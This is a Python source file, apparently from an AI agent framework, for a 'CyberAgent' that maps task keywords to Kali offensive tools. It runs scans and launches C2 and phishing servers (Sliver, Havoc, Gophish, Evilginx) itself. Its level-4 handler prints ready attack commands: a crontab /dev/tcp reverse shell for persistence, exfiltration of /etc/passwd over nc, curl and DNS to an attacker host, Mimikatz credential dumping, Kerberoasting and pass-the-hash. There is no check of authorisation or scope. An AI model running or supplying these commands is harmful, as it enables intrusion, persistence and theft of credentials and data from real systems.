"""
CyberAgent OSEE — dispatch intelligent vers les outils Kali.
Détecte la catégorie de tâche, sélectionne l'outil, exécute, parse et analyse.
"""
import re
import os
import tempfile
from typing import Optional
from core.agents.base_agent import BaseAgent
from core.tools.terminal import terminal
from core.tools.c2_manager import c2_manager
from core.tools.kali_tools import search_tools, get_tool, get_by_category, catalog_summary, list_interactive_tools
from core.tools.exploit_engine import (
    checksec, rop_gadgets, find_gadget, cyclic, cyclic_find,
    cyclic_64, cyclic_find_64, get_shellcode, encode_xor,
    elf_info, exploit_summary, find_offset,
)
from core.tools.offensive_engine import offensive

# ── Mots-clés de déclenchement par catégorie ─────────────────────────────────
_TRIGGER_MAP = {
    "recon": [
        "scan", "nmap", "masscan", "rustscan", "port", "ports", "réseau", "network",
        "hôte", "host", "ping", "arp", "netdiscover", "découverte",
        "dns", "dnsenum", "dnsrecon", "fierce", "amass", "sublist3r", "subfinder",
        "sous-domaine", "subdomain", "whois", "theharvester", "osint",
        "shodan", "maltego", "spiderfoot",
    ],
    "web": [
        "nikto", "gobuster", "dirb", "ffuf", "wfuzz", "dirsearch",
        "web", "http", "https", "répertoire", "directory", "fuzz",
        "sqlmap", "injection", "sql", "wpscan", "wordpress",
        "whatweb", "wafw00f", "vhost", "virtualhost",
        "burp", "burpsuite", "proxy web", "intercepter requête",
        "zap", "zaproxy", "owasp", "scanner web",
    ],
    "passwords": [
        "hydra", "medusa", "hashcat", "john", "brute", "bruteforce", "crack",
        "hash", "password", "mot de passe", "credentials", "crédentiels",
        "crackmapexec", "cme", "evil-winrm", "winrm", "kerbrute", "kerberos",
    ],
    "exploitation": [
        "exploit", "msfvenom", "payload", "reverse shell", "bind shell", "shellcode",
        "metasploit", "msfconsole", "msf", "meterpreter", "searchsploit", "exploitdb",
        "impacket", "secretsdump", "psexec", "wmiexec", "ntlmrelay",
    ],
    "reversing": [
        "gdb", "r2", "radare2", "objdump", "readelf", "nm", "strings",
        "désassemble", "desassemble", "disassemble", "reverse engineering",
        "rop", "gadget", "gadgets", "rop chain", "chaîne rop",
        "binwalk", "checksec", "protections", "mitigations", "pie", "aslr", "nx", "canary",
        "ltrace", "strace", "binaire", "binary", "fichier elf", "pwndbg", "peda", "gef",
    ],
    "exploit_engine": [
        "cyclic", "pattern", "offset", "cyclic_find", "de bruijn",
        "shellcode", "xor encode", "xor decoder",
        "checksec", "checksec binaire",
        "rop gadget", "ropper", "ropgadget",
        "exploit_summary", "analyse binaire", "analyze binary",
    ],
    "network": [
        "tcpdump", "tshark", "wireshark", "capture",
        "responder", "ntlmv2", "llmnr", "nbt-ns",
        "bettercap", "ettercap", "mitm", "arp spoofing", "arp-spoofing",
        "netcat", "nc", "socat", "ncat",
        "proxy", "proxychains",
    ],
    "wireless": [
        "aircrack", "aircrack-ng", "airodump", "airodump-ng",
        "aireplay", "aireplay-ng", "airmon", "airmon-ng",
        "wifi", "wpa", "wpa2", "wep",
        "handshake", "beacon", "essid", "bssid", "deauth",
        "mode monitor", "monitor mode", "wlan",
    ],
    "forensics": [
        "volatility", "volatility3", "dump mémoire", "memory dump",
        "foremost", "binwalk", "exiftool", "stéganographie", "steganography",
        "steghide", "forensics", "forensique",
    ],
    "smb": [
        "smb", "smbclient", "smbmap", "enum4linux", "rpcclient",
        "active directory", "ad", "ldap", "ntlm", "domain", "domaine",
    ],
}

_ALL_KEYWORDS: dict[str, list[str]] = {}
for cat, kws in _TRIGGER_MAP.items():
    for kw in kws:
        _ALL_KEYWORDS.setdefault(kw, []).append(cat)

# ── Mots-clés des 4 niveaux offensifs ────────────────────────────────────────
_LEVEL_KEYWORDS = {
    1: ["niveau 1", "level 1", "recon avancé", "reconnaissance avancée", "cartographier",
        "analyser logiciel", "comprendre système", "analyser binaire", "strings", "fingerprint"],
    2: ["niveau 2", "level 2", "fuzzing", "fuzz", "afl", "afl++", "libfuzzer", "crash",
        "valgrind", "asan", "sanitizer", "0-day", "zeroday", "bug mémoire", "overflow",
        "use after free", "uaf", "static analysis", "semgrep", "bandit", "cppcheck"],
    3: ["niveau 3", "level 3", "exploitation", "privesc", "privilege escalation",
        "élévation de privilèges", "linpeas", "suid", "ret2libc", "rop chain",
        "buffer overflow", "shellcode", "pwntools", "heap spray", "rce", "remote code"],
    4: ["niveau 4", "level 4", "pivot", "pivoting", "persistance", "persistence",
        "mouvement latéral", "lateral movement", "chisel", "ligolo", "proxychains",
        "bloodhound", "pass-the-hash", "pth", "exfiltration", "c2", "apt", "pspy",
        "sliver", "havoc", "mythic", "meterpreter", "cobalt strike",
        "phishing", "gophish", "evilginx", "setoolkit",
        "mimikatz", "rubeus", "powerview", "kerberoast", "as-rep", "asrep",
        "netexec", "crackmapexec"],
    0: ["pipeline", "fuzzing pipeline", "fuzz crash", "crash exploit", "fuzzing exploit",
        "exploit template", "générer exploit", "workflow complet", "fuzz → exploit"],
}


class CyberAgent(BaseAgent):
    name = "cyber"
    description = "Expert OSEE — 4 niveaux Red Team, fuzzing pipeline, recon, exploitation, mouvement"

    def can_handle(self, task: str) -> bool:
        t = task.lower()
        if any(kw in t for kw in _ALL_KEYWORDS):
            return True
        for kws in _LEVEL_KEYWORDS.values():
            if any(kw in t for kw in kws):
                return True
        return False

    async def run(self, task: str, context: Optional[dict] = None) -> dict:
        t = task.lower().strip()

        # 0. Niveaux offensifs explicites
        level_result = self._dispatch_level(task, t)
        if level_result is not None:
            return level_result

        # 1. Exploit engine (pas de commande shell)
        if self._is_exploit_engine(t):
            return self._handle_exploit_engine(task)

        # 2. Commande directe (commence par un nom d'outil connu avec flags CLI)
        direct_cmd = self._extract_direct_command(task)
        if direct_cmd:
            return self._run_command(direct_cmd, task)

        # 3. Dispatch par catégorie
        category = self._detect_category(t)
        if category == "recon":
            return self._handle_recon(task)
        elif category == "web":
            return self._handle_web(task)
        elif category == "passwords":
            return self._handle_passwords(task)
        elif category == "exploitation":
            return self._handle_exploitation(task)
        elif category == "reversing":
            return self._handle_reversing(task)
        elif category == "network":
            return self._handle_network(task)
        elif category == "forensics":
            return self._handle_forensics(task)
        elif category == "wireless":
            return self._handle_wireless(task)
        elif category == "smb":
            return self._handle_smb(task)

        # 4. Catalogue
        if any(kw in t for kw in ["liste", "list", "catalogue", "quels outils", "what tools", "available"]):
            return self._result(True, catalog_summary())

        return self._result(False, f"Je n'ai pas pu déterminer l'action pour : {task!r}. "
                                   f"Passe par /chat pour que l'IA interprète ta demande.")

    # ── Dispatch niveaux offensifs ────────────────────────────────────────────

    def _dispatch_level(self, task: str, t: str) -> Optional[dict]:
        # Pipeline complet
        if any(kw in t for kw in _LEVEL_KEYWORDS[0]):
            return self._handle_pipeline(task)

        # Niveau 2 — fuzzing / vuln finding
        if any(kw in t for kw in _LEVEL_KEYWORDS[2]):
            return self._handle_level2(task)

        # Niveau 3 — exploitation avancée
        if any(kw in t for kw in _LEVEL_KEYWORDS[3]):
            return self._handle_level3(task)

        # Niveau 4 — mouvement avancé
        if any(kw in t for kw in _LEVEL_KEYWORDS[4]):
            return self._handle_level4(task)

        # Niveau 1 explicite (recon avancé)
        if any(kw in t for kw in _LEVEL_KEYWORDS[1]):
            return self._handle_level1(task)

        return None

    def _handle_level1(self, task: str) -> dict:
        lvl = offensive.get_level(1)
        target = self._extract_target(task) or self._extract_url_or_target(task)
        binary = self._extract_file_path(task)
        t = task.lower()

        if binary and any(kw in t for kw in ["strings", "analyse binaire", "readelf", "objdump"]):
            tool_name = "strings" if "strings" in t else ("readelf" if "readelf" in t else "objdump")
            result = offensive.run_level_tool(1, tool_name, {"binary": binary})
            return self._result(result["success"], result.get("output", ""), result)

        if target:
            tool_name = "nuclei" if "cve" in t else ("gobuster" if "répertoire" in t or "dir" in t else "nmap")
            result = offensive.run_level_tool(1, tool_name, {"target": target})
            return self._result(result["success"], result.get("output", ""), result)

        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
        return self._result(True,
            f"{lvl.icon} NIVEAU 1 — {lvl.name}\n"
            f"Impact : {lvl.impact}\n\n"
            f"Outils disponibles :\n{tools_list}\n\n"
            f"Spécifie une cible (IP, domaine) ou un binaire pour lancer.",
            {"level": 1, "tools": [t.name for t in lvl.tools]})

    def _handle_level2(self, task: str) -> dict:
        t = task.lower()
        binary = self._extract_file_path(task)

        if any(kw in t for kw in ["fuzz", "afl", "afl++"]):
            if binary:
                result = offensive.run_pipeline("fuzz", binary=binary, timeout=20)
                out = (
                    f"Fuzzing lancé sur {binary}\n"
                    f"Crashs trouvés : {result.get('crashes_found', 0)}\n"
                    f"Résultat AFL++ :\n{result.get('result', '')[:500]}\n\n"
                    f"Prochaine étape : {result.get('next_step', '')}"
                )
                return self._result(result["success"], out, result)
            return self._result(True,
                "🐛 NIVEAU 2 — Fuzzing avec AFL++\n\n"
                "Workflow :\n"
                "  1. Préparer corpus : mkdir corpus && echo 'test' > corpus/seed\n"
                "  2. Lancer AFL++ : afl-fuzz -i corpus/ -o findings/ -- ./binary @@\n"
                "  3. Analyser crashs : ls findings/default/crashes/\n"
                "  4. Rejouer crash : ./binary < findings/default/crashes/id:000000*\n\n"
                "Spécifie le binaire à fuzzer pour lancer directement.\n"
                "Ex: fuzzer ./target",
                {"level": 2})

        if any(kw in t for kw in ["crash", "analyse crash", "triage"]):
            crash = self._extract_file_path(task)
            if binary and crash:
                result = offensive.run_pipeline("analyse_crash", binary=binary, crash=crash)
                return self._result(result["success"],
                    f"Analyse crash {crash} :\n"
                    f"Exploitabilité : {result.get('exploitability', {}).get('recommendation', '')}\n"
                    f"Score : {result.get('exploitability', {}).get('score', 0)}/10\n\n"
                    f"Stack trace :\n{result.get('gdb_trace', '')[:800]}\n\n"
                    f"Prochaine étape : {result.get('next_step', '')}",
                    result)

        if any(kw in t for kw in ["valgrind", "mémoire", "memory", "leak"]):
            if binary:
                return self._run_command(f"valgrind --tool=memcheck --leak-check=full {binary}", task)

        if any(kw in t for kw in ["semgrep", "bandit", "static", "analyse code"]):
            path = binary or "."
            if "python" in t or "bandit" in t:
                return self._run_command(f"bandit -r {path} -l", task)
            return self._run_command(f"semgrep --config=auto {path}", task)

        lvl = offensive.get_level(2)
        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
        return self._result(True,
            f"{lvl.icon} NIVEAU 2 — {lvl.name}\n"
            f"Impact : {lvl.impact}\n\n"
            f"Outils disponibles :\n{tools_list}\n\n"
            f"Commandes rapides :\n"
            f"  fuzzer ./binary         → AFL++ fuzzing\n"
            f"  valgrind ./binary       → analyse mémoire\n"
            f"  semgrep ./src/          → analyse statique\n"
            f"  searchsploit apache 2.4 → recherche CVE",
            {"level": 2, "tools": [t.name for t in lvl.tools]})

    def _handle_level3(self, task: str) -> dict:
        t = task.lower()
        binary = self._extract_file_path(task)

        if any(kw in t for kw in ["privesc", "privilege", "élévation", "linpeas", "suid"]):
            if "suid" in t:
                return self._run_command("find / -perm -4000 -user root -type f 2>/dev/null", task)
            if "sudo" in t:
                return self._run_command("sudo -l 2>/dev/null", task)
            return self._result(True,
                "💥 NIVEAU 3 — Élévation de privilèges Linux\n\n"
                "Checklist :\n"
                "  1. sudo -l                                   → droits sudo\n"
                "  2. find / -perm -4000 -user root -type f     → binaires SUID\n"
                "  3. bash linpeas.sh                           → enum complète\n"
                "  4. cat /etc/crontab                          → tâches cron\n"
                "  5. ls -la /etc/passwd /etc/shadow            → permissions\n"
                "  6. uname -a && cat /etc/issue               → version kernel\n"
                "  7. searchsploit linux kernel <version>       → exploits kernel\n\n"
                "GTFOBins : https://gtfobins.github.io/ (exploits SUID/sudo)",
                {"level": 3})

        if any(kw in t for kw in ["rop", "ret2libc", "exploit template", "générer exploit"]):
            if binary:
                offset_match = re.search(r"\boffset[:\s]+(\d+)\b", t)
                offset = int(offset_match.group(1)) if offset_match else 0
                lhost = self._extract_ip(task) or "127.0.0.1"
                lport = int(self._extract_port(task) or 4444)
                result = offensive.run_pipeline("exploit_template", binary=binary,
                                                offset=offset, lhost=lhost, lport=lport)
                return self._result(result["success"],
                    f"Template exploit généré :\n"
                    f"Stratégie : {result.get('strategy', '')}\n"
                    f"Protections : {result.get('protections', {})}\n\n"
                    f"Code pwntools :\n{result.get('exploit_template', '')}",
                    result)

        if any(kw in t for kw in ["rce", "shellcode", "pwntools"]):
            if binary:
                result = offensive.run_pipeline("reverse", binary=binary)
                return self._result(result["success"],
                    f"Analyse exploitation de {binary} :\n"
                    f"Fonctions dangereuses : {result.get('dangerous_functions', [])}\n"
                    f"Gadgets ROP :\n{result.get('rop_gadgets_sample', '')[:600]}",
                    result)

        lvl = offensive.get_level(3)
        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
        return self._result(True,
            f"{lvl.icon} NIVEAU 3 — {lvl.name}\n"
            f"Impact : {lvl.impact}\n\n"
            f"Outils disponibles :\n{tools_list}\n\n"
            f"Commandes rapides :\n"
            f"  privesc linux             → checklist élévation de privs\n"
            f"  exploit template ./binary → générer exploit pwntools\n"
            f"  rop gadgets ./binary      → chaîne ROP\n"
            f"  metasploit exploit/...    → Metasploit Framework",
            {"level": 3, "tools": [t.name for t in lvl.tools]})

    def _handle_level4(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)
        lhost = self._extract_ip(task)
        lport = self._extract_port(task) or "4444"

        if any(kw in t for kw in ["pivot", "chisel", "tunnel"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Pivoting réseau\n\n"
                "Chisel (tunnel TCP/HTTP) :\n"
                "  Attaquant : chisel server -p 8080 --reverse\n"
                "  Victime   : chisel client <attaquant>:8080 R:socks\n"
                "  Config    : proxychains4 → socks5 127.0.0.1 1080\n\n"
                "Ligolo-ng (plus rapide) :\n"
                "  Proxy     : ligolo-ng -selfcert -laddr 0.0.0.0:443\n"
                "  Agent     : ligolo-ng -connect <attaquant>:443 -ignore-cert\n\n"
                "SSHuttle (VPN SSH) :\n"
                f"  sshuttle -r user@{target or 'pivot'} 10.0.0.0/8",
                {"level": 4})

        if any(kw in t for kw in ["persist", "persistance", "crontab", "cron", "backdoor"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Persistance\n\n"
                f"Crontab (sans root) :\n"
                f"  (crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/{lhost or 'LHOST'}/{lport} 0>&1') | crontab -\n\n"
                f"Clé SSH :\n"
                f"  mkdir -p ~/.ssh && echo '<pubkey>' >> ~/.ssh/authorized_keys\n\n"
                f"Service systemd (root) :\n"
                f"  Créer /etc/systemd/system/svc.service avec ExecStart reverse shell\n"
                f"  systemctl enable svc && systemctl start svc\n\n"
                f"Meterpreter — persistance :\n"
                f"  meterpreter> run persistence -X -i 60 -p {lport} -r {lhost or 'LHOST'}",
                {"level": 4})

        if any(kw in t for kw in ["latéral", "lateral", "crackmapexec", "psexec", "wmiexec"]):
            if not target:
                return self._result(False, "Spécifie la cible et les credentials.")
            return self._result(True,
                f"🧠 NIVEAU 4 — Mouvement latéral vers {target}\n\n"
                f"SMB (crackmapexec) :\n"
                f"  crackmapexec smb {target} -u user -p 'pass'\n"
                f"  crackmapexec smb {target} -u user -H <nthash>\n\n"
                f"PSExec (Impacket) :\n"
                f"  impacket-psexec domain/user:'pass'@{target}\n\n"
                f"WMIExec (sans fichiers) :\n"
                f"  impacket-wmiexec domain/user:'pass'@{target}\n\n"
                f"WinRM :\n"
                f"  evil-winrm -i {target} -u user -p 'pass'\n"
                f"  evil-winrm -i {target} -u user -H <nthash>",
                {"level": 4})

        if any(kw in t for kw in ["exfil", "exfiltration", "extraire données"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Exfiltration de données\n\n"
                "Via netcat (simple) :\n"
                f"  Récepteur : nc -lvnp {lport} > loot.tar.gz\n"
                f"  Victime   : tar czf - /données | nc {lhost or 'LHOST'} {lport}\n\n"
                "Via HTTP (discret) :\n"
                f"  curl -s -X POST http://{lhost or 'LHOST'}:{lport} -d @/etc/passwd\n\n"
                "Via DNS (très discret) :\n"
                "  base64 /etc/passwd | while read l; do dig $l.attaquant.com; done",
                {"level": 4})

        # ── C2 Frameworks — exécution réelle via c2_manager ──────────────────
        _c2_start_kw = {
            "sliver":   ["sliver démarrer", "sliver start", "lance sliver", "démarrer sliver", "start sliver"],
            "havoc":    ["havoc démarrer", "havoc start", "lance havoc", "démarrer havoc", "start havoc"],
            "gophish":  ["gophish démarrer", "gophish start", "lance gophish", "démarrer gophish", "start gophish"],
            "evilginx": ["evilginx démarrer", "evilginx start", "lance evilginx", "démarrer evilginx", "start evilginx"],
        }
        _c2_stop_kw = {
            "sliver":   ["sliver stop", "arrêter sliver", "arrête sliver", "stop sliver", "tuer sliver"],
            "havoc":    ["havoc stop", "arrêter havoc", "arrête havoc", "stop havoc", "tuer havoc"],
            "gophish":  ["gophish stop", "arrêter gophish", "arrête gophish", "stop gophish", "tuer gophish"],
            "evilginx": ["evilginx stop", "arrêter evilginx", "arrête evilginx", "stop evilginx", "tuer evilginx"],
        }
        _c2_logs_kw = {
            "sliver":   ["sliver logs", "sliver status", "sliver état"],
            "havoc":    ["havoc logs", "havoc status", "havoc état"],
            "gophish":  ["gophish logs", "gophish status", "gophish état"],
            "evilginx": ["evilginx logs", "evilginx status", "evilginx état"],
        }

        for c2_name, kws in _c2_start_kw.items():
            if any(kw in t for kw in kws):
                res = c2_manager.start(c2_name)
                if res["success"]:
                    status = c2_manager.status(c2_name)
                    msg = (f"✅ {c2_name.upper()} démarré — PID {res['pid']}\n"
                           f"Port : {status.get('port', 'N/A')}\n"
                           f"{status['description']}\n\n"
                           f"Logs en direct disponibles via : '{c2_name} logs'")
                else:
                    msg = f"❌ Échec démarrage {c2_name} : {res['error']}"
                return self._result(res["success"], msg, {"level": 4, "tool": c2_name, "action": "start"})

        for c2_name, kws in _c2_stop_kw.items():
            if any(kw in t for kw in kws):
                res = c2_manager.stop(c2_name)
                msg = f"✅ {c2_name.upper()} arrêté." if res["success"] else f"❌ {res['error']}"
                return self._result(res["success"], msg, {"level": 4, "tool": c2_name, "action": "stop"})

        for c2_name, kws in _c2_logs_kw.items():
            if any(kw in t for kw in kws):
                status = c2_manager.status(c2_name)
                logs = c2_manager.logs(c2_name, 30)
                state = "🟢 EN COURS" if status["running"] else "🔴 ARRÊTÉ"
                uptime = f" — uptime {status['uptime']}" if status.get("uptime") else ""
                lines = "\n".join(logs["lines"]) if logs["lines"] else "(aucun log)"
                msg = f"{c2_name.upper()} {state}{uptime}\n\n{lines}"
                return self._result(True, msg, {"level": 4, "tool": c2_name, "action": "logs"})

        # Status global C2
        if any(kw in t for kw in ["c2 status", "état c2", "c2 liste", "list c2", "tous les c2"]):
            all_c2 = c2_manager.list_all()
            lines = []
            for s in all_c2:
                icon = "🟢" if s["running"] else "🔴"
                uptime = f" (uptime: {s['uptime']})" if s.get("uptime") else ""
                lines.append(f"{icon} {s['name'].upper()}{uptime} — {s['description']}")
            return self._result(True, "🧠 C2 Frameworks :\n\n" + "\n".join(lines),
                                {"level": 4, "action": "status_all"})

        # Déclencheurs génériques (sans action = affiche guide + état)
        if any(kw in t for kw in ["sliver", "c2 sliver"]):
            s = c2_manager.status("sliver")
            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
            return self._result(True,
                f"🧠 C2 — Sliver [{state}]\n\n"
                "Commandes :\n"
                "  'sliver démarrer'  → lance le serveur\n"
                "  'sliver stop'      → arrête le serveur\n"
                "  'sliver logs'      → affiche les logs\n\n"
                f"Port MTLS : {s['port']} | PID : {s.get('pid', 'N/A')}",
                {"level": 4, "tool": "sliver"})

        if any(kw in t for kw in ["havoc", "c2 havoc"]):
            s = c2_manager.status("havoc")
            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
            return self._result(True,
                f"🧠 C2 — Havoc [{state}]\n\n"
                "Commandes :\n"
                "  'havoc démarrer'  → lance le teamserver\n"
                "  'havoc stop'      → arrête le serveur\n"
                "  'havoc logs'      → affiche les logs\n\n"
                f"Port Teamserver : {s['port']} | PID : {s.get('pid', 'N/A')}",
                {"level": 4, "tool": "havoc"})

        if any(kw in t for kw in ["mythic", "c2 mythic"]):
            return self._result(True,
                "🧠 C2 — Mythic (framework modulaire, Docker)\n\n"
                "Mythic nécessite Docker. Installation :\n"
                "  git clone https://github.com/its-a-feature/Mythic\n"
                "  cd Mythic && sudo ./install_docker_ubuntu.sh\n"
                "  sudo make && sudo ./mythic-cli start\n\n"
                "Accès : https://localhost:7443 (login mythic_admin)",
                {"level": 4, "tool": "mythic"})

        if any(kw in t for kw in ["meterpreter", "metasploit c2", "msf c2"]):
            lport_val = lport or "4444"
            return self._result(True,
                "🧠 C2 — Meterpreter (Metasploit)\n\n"
                "Listener :\n"
                f"  msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {lhost or 'LHOST'}; set LPORT {lport_val}; run'\n\n"
                "Commandes Meterpreter :\n"
                "  sysinfo ; getuid ; getsystem (privesc)\n"
                "  hashdump (SAM) ; run post/multi/recon/local_exploit_suggester\n"
                "  upload / download\n"
                "  portfwd add -l 8080 -p 80 -r victim\n"
                "  run post/multi/manage/shell_to_meterpreter\n"
                "  load kiwi ; creds_all (mimikatz)",
                {"level": 4, "tool": "meterpreter"})

        # ── Phishing ──────────────────────────────────────────────────────────
        if any(kw in t for kw in ["phishing", "gophish", "campagne phishing"]):
            s = c2_manager.status("gophish")
            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
            return self._result(True,
                f"🧠 NIVEAU 4 — Gophish [{state}]\n\n"
                "Commandes :\n"
                "  'gophish démarrer'  → lance le serveur (UI port 3333)\n"
                "  'gophish stop'      → arrête le serveur\n"
                "  'gophish logs'      → affiche les logs\n\n"
                f"PID actuel : {s.get('pid', 'N/A')}\n\n"
                "Une fois démarré → http://localhost:3333 (admin/gophish)",
                {"level": 4, "tool": "gophish"})

        if any(kw in t for kw in ["evilginx", "mfa bypass", "adversary-in-the-middle"]):
            s = c2_manager.status("evilginx")
            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
            return self._result(True,
                f"🧠 NIVEAU 4 — Evilginx AiTM [{state}]\n\n"
                "Commandes :\n"
                "  'evilginx démarrer'  → lance le proxy (ports 443/80)\n"
                "  'evilginx stop'      → arrête le proxy\n"
                "  'evilginx logs'      → affiche les logs\n\n"
                f"PID actuel : {s.get('pid', 'N/A')}\n\n"
                "Phishlets disponibles : o365, gmail, linkedin, github, dropbox",
                {"level": 4, "tool": "evilginx"})

        # ── AD / Kerberos ─────────────────────────────────────────────────────
        if any(kw in t for kw in ["mimikatz", "credentials windows", "lsass dump"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Mimikatz (Credential Dump)\n\n"
                "Via Meterpreter (recommandé) :\n"
                "  meterpreter> load kiwi\n"
                "  meterpreter> creds_all\n"
                "  meterpreter> lsa_dump_secrets\n\n"
                "Via Wine (Linux) :\n"
                "  wine /usr/share/mimikatz/x64/mimikatz.exe\n\n"
                "Commandes clés :\n"
                "  sekurlsa::logonpasswords    (passwords en clair LSASS)\n"
                "  lsadump::sam               (hash SAM)\n"
                "  lsadump::lsa /patch         (hashes LSA)\n"
                "  sekurlsa::tickets /export   (tickets Kerberos)\n"
                "  kerberos::ptt ticket.kirbi  (Pass-the-Ticket)",
                {"level": 4, "tool": "mimikatz"})

        if any(kw in t for kw in ["rubeus", "kerberoast", "as-rep", "asrep", "pass-the-ticket", "kerberos attaque"]):
            return self._result(True,
                "🧠 NIVEAU 4 — Rubeus (Attaques Kerberos)\n\n"
                "Kerberoasting (obtenir TGS crackables) :\n"
                "  Rubeus.exe kerberoast /outfile:hashes.txt\n"
                "  hashcat -m 13100 hashes.txt rockyou.txt\n\n"
                "AS-REP Roasting (pas de pré-auth) :\n"
                "  Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n"
                "  hashcat -m 18200 asrep.txt rockyou.txt\n\n"
                "Pass-the-Ticket :\n"
                "  Rubeus.exe ptt /ticket:base64encodedticket\n\n"
                "Dump tickets existants :\n"
                "  Rubeus.exe dump /service:krbtgt\n\n"
                "Note : Rubeus est un outil Windows — utiliser depuis une machine Windows\n"
                "Alternative Linux : impacket-GetUserSPNs (kerberoast), impacket-GetNPUsers (AS-REP)",
                {"level": 4, "tool": "rubeus"})

        if any(kw in t for kw in ["netexec", "nxc", "crackmapexec", "cme"]):
            target_str = target or "<subnet>"
            return self._result(True,
                f"🧠 NIVEAU 4 — NetExec (CrackMapExec v2)\n\n"
                f"Scan réseau Windows :\n"
                f"  netexec smb {target_str}/24 --gen-relay-list relays.txt\n\n"
                f"Authentification / password spray :\n"
                f"  netexec smb {target_str} -u users.txt -p passwords.txt --continue-on-success\n"
                f"  netexec smb {target_str} -u user -H <nthash>  (Pass-the-Hash)\n\n"
                f"Shares et informations :\n"
                f"  netexec smb {target_str} -u user -p 'pass' --shares\n"
                f"  netexec ldap {target_str} -u '' -p '' --users\n\n"
                f"Exécution de commandes :\n"
                f"  netexec winrm {target_str} -u admin -p 'pass' -x 'whoami'\n"
                f"  netexec smb {target_str} -u admin -p 'pass' -M mimikatz",
                {"level": 4, "tool": "netexec"})

        if any(kw in t for kw in ["shodan", "reconnaissance internet", "appareils exposés"]):
            query = re.sub(r"shodan\s*", "", task, flags=re.IGNORECASE).strip()
            if query and not any(kw in query.lower() for kw in ["guide", "aide", "help", "quoi"]):
                return self._run_command(f"shodan search '{query}'", task)
            return self._result(True,
                "🔍 Shodan — Moteur de recherche d'appareils exposés\n\n"
                "Commandes utiles :\n"
                "  shodan search 'apache country:FR'\n"
                "  shodan search 'default password'\n"
                "  shodan host <IP>           (infos sur une IP)\n"
                "  shodan count 'mongodb'\n"
                "  shodan stats --facets country,port 'nginx'\n\n"
                "Filtres puissants :\n"
                "  port:22 country:US org:'Amazon'\n"
                "  product:'IIS' version:'7.5'\n"
                "  vuln:CVE-2021-44228  (Log4Shell)\n\n"
                "Configuration : shodan init <API_KEY>",
                {"level": 1, "tool": "shodan"})

        lvl = offensive.get_level(4)
        tools_list = "\n".join(f"  [{t.category}] {t.name} — {t.description}" for t in lvl.tools)
        return self._result(True,
            f"{lvl.icon} NIVEAU 4 — {lvl.name}\n"
            f"Impact : {lvl.impact}\n\n"
            f"Outils disponibles ({len(lvl.tools)}) :\n{tools_list}\n\n"
            f"Domaines couverts :\n"
            f"  C2         → sliver | havoc | mythic | meterpreter\n"
            f"  Phishing   → gophish | evilginx | setoolkit\n"
            f"  AD/Kerberos→ mimikatz | rubeus | bloodhound | powerview\n"
            f"  Mouvement  → netexec | impacket | evil-winrm\n"
            f"  Pivot      → chisel | ligolo-ng | proxychains | sshuttle\n"
            f"  Persistance→ crontab | ssh keys | systemd | meterpreter\n"
            f"  Exfil      → nc | curl | dns",
            {"level": 4, "tools": [t.name for t in lvl.tools]})

    def _handle_pipeline(self, task: str) -> dict:
        t = task.lower()
        binary = self._extract_file_path(task)

        stages = {
            "fuzz": any(kw in t for kw in ["fuzz", "afl"]),
            "reverse": any(kw in t for kw in ["reverse", "analyser", "r2", "gdb"]),
            "exploit": any(kw in t for kw in ["exploit", "payload", "rop"]),
        }

        if binary and stages["fuzz"]:
            result = offensive.run_pipeline("fuzz", binary=binary, timeout=15)
            return self._result(True,
                f"Pipeline Fuzzing → Exploit sur {binary}\n\n"
                f"Étape 1/4 — FUZZING AFL++\n"
                f"  Crashs trouvés : {result.get('crashes_found', 0)}\n"
                f"  {result.get('result', '')[:300]}\n\n"
                f"Étape 2/4 — ANALYSE CRASH\n"
                f"  Commande : analyse_crash {binary} findings/default/crashes/id:000000*\n\n"
                f"Étape 3/4 — REVERSE ENGINEERING\n"
                f"  Commande : reverse {binary}\n\n"
                f"Étape 4/4 — EXPLOIT DEV\n"
                f"  Commande : exploit template {binary} offset 72",
                result)

        if binary and stages["reverse"]:
            result = offensive.run_pipeline("reverse", binary=binary)
            return self._result(result["success"],
                f"Analyse reverse de {binary} :\n\n"
                f"Protections :\n{result.get('checksec', '')}\n\n"
                f"Fonctions dangereuses : {result.get('dangerous_functions', [])}\n\n"
                f"Strings intéressantes : {result.get('interesting_strings', [])}\n\n"
                f"Gadgets ROP :\n{result.get('rop_gadgets_sample', '')[:800]}",
                result)

        return self._result(True,
            "Pipeline complet Fuzzing → Crash → Reverse → Exploit\n\n"
            "Étape 1 — FUZZING (trouver des crashs) :\n"
            "  mkdir corpus && echo 'test' > corpus/seed\n"
            "  afl-fuzz -i corpus/ -o findings/ -- ./binary @@\n\n"
            "Étape 2 — ANALYSE CRASH (exploitabilité) :\n"
            "  gdb -batch -ex 'run < crash' -ex 'bt full' ./binary\n"
            "  checksec --file=./binary\n\n"
            "Étape 3 — REVERSE (comprendre le bug) :\n"
            "  reverse ./binary          → analyse complète via L'Œil\n"
            "  r2 -A ./binary            → radare2\n\n"
            "Étape 4 — EXPLOIT DEV :\n"
            "  exploit template ./binary offset 72 LHOST 10.0.0.1\n\n"
            "Spécifie le binaire pour lancer le pipeline complet.\n"
            "Ex: fuzzer ./target | pipeline ./target",
            {"pipeline": ["fuzz", "analyse_crash", "reverse", "exploit_template"]})

    # ── Catégorie détection ───────────────────────────────────────────────────

    def _detect_category(self, task: str) -> Optional[str]:
        scores: dict[str, int] = {}
        for kw, cats in _ALL_KEYWORDS.items():
            if kw in task:
                for cat in cats:
                    scores[cat] = scores.get(cat, 0) + 1
        return max(scores, key=scores.get) if scores else None

    def _is_exploit_engine(self, t: str) -> bool:
        return any(kw in t for kw in [
            "cyclic", "cyclic_find", "checksec", "ropgadget", "ropper",
            "shellcode template", "xor encode", "exploit_summary", "analyse binaire",
